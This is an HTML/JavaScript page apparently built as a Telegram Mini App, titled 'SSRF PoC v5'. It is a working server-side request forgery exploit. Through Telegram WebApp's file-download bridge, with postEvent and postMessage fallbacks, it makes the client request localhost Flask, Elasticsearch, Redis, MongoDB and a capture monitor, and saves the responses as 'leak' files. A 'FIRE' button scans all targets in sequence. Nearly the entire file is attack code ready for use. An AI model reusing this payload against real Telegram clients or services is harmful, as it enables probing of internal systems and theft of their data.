<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>SSRF PoC v5</title>
<style>
body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
h2{color:#f44;margin:0 0 4px 0}
#log{background:#111;padding:6px;max-height:260px;overflow:auto;white-space:pre-wrap;font:11px monospace}
button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
button.fire{background:#4a0000;border-color:#f44;font-size:13px}
</style></head><body>
<h2>SSRF PoC v5 — TW.postEvent bridge</h2>
<div id="log">Init...</div>
<div id="btns"></div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
const L = (s) => { const e=document.getElementById('log'); e.textContent += s+'\n'; e.scrollTop = e.scrollHeight; };
const TW = Telegram.WebApp;
TW.ready(); TW.expand();
L(`WebApp v${TW.version} | postEvent=${typeof TW.postEvent} | requestFileDownload=${typeof TW.requestFileDownload}`);

const T = [
  ['http://127.0.0.1:5000/', 'flask_leak.json', 'Flask (:5000)'],
  ['http://127.0.0.1:9200/', 'elastic_leak.json', 'Elastic (:9200)'],
  ['http://127.0.0.1:6379/', 'redis_leak.txt', 'Redis (:6379)'],
  ['http://127.0.0.1:27017/', 'mongo_leak.txt', 'MongoDB (:27017)'],
  ['http://127.0.0.1:9999/ssrf_capture', 'capture.json', 'Monitor (:9999)'],
];

const fire = (url, name) => {
  L(`TX: ${url}`);
  if (typeof TW.requestFileDownload === 'function') {
    TW.requestFileDownload({url, file_name: name});
  } else if (typeof TW.postEvent === 'function') {
    TW.postEvent('web_app_request_file_download', '', {url, file_name: name});
  } else {
    window.parent.postMessage(JSON.stringify(['web_app_request_file_download', {url, file_name: name}]), '*');
  }
};

let idx = 0;
function fireAll() { idx=0; next(); }
function next() {
  if (idx>=T.length) { L('=== DONE === Check http://127.0.0.1:9999'); return; }
  const [u,n,d]=T[idx]; L(`[${++idx}/${T.length}] ${d}`); fire(u,n); setTimeout(next,3000);
}

document.getElementById('btns').innerHTML = `
  <button class="fire" onclick="fireAll()">FIRE: Scan All 5</button>
  ${T.map(([u,n,d],i)=>`<button onclick="fire('${u}','${n}');L('Single: ${d}')">${d}</button>`).join('')}
`;
</script>
</body>
</html>
